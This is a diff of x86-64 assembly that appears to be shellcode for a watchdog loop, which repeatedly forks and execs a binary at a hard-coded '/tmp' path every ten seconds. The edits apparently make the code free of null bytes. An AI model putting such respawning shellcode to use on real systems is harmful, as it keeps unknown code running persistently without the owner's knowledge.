@@ -23,14 +23,12 @@ watchdog:
 	je  exec; exec if in child
 
 	;;   sleep
-	mov  rax, 0
+	xor  rax, rax
 	mov  al, 0x23; syscall nanosleep
-	xor  rbx, rbx
-	mov  bl, 10
-	push rbx; sleep sec
-	push rbx
+	push 10; sleep sec
+	push 10
 	mov  rdi, rsp
-	xor  rsi, rsi; no more args
+	xor  rsi, rsi
 	xor  rdx, rdx
 	syscall
 	loop watchdog
@@ -38,11 +36,10 @@ watchdog:
 exec:
 	;;   char **envp
 	xor  rdx, rdx
-	push rdx
+	push rdx; '\0'
 
 	;;   char *filename
 	xor  rax, rax
-	push rax; '\0' string terminator
 	mov  rdi, 0x652f2f706d742f2f; path to the executable
 	push rdi; save to stack
 	push rsp
@@ -62,14 +59,3 @@ exec:
 pause:
 	;;  trap
 	int 0x3
-
-	; exit:
-	; ;; exit
-	; xor rax, rax
-	; xor rdi, rdi
-	; xor rsi, rsi
-	; mov al, 0x3c; syscall exit
-	; mov di, 0x0; exit code
-	; syscall
-
-	section .data
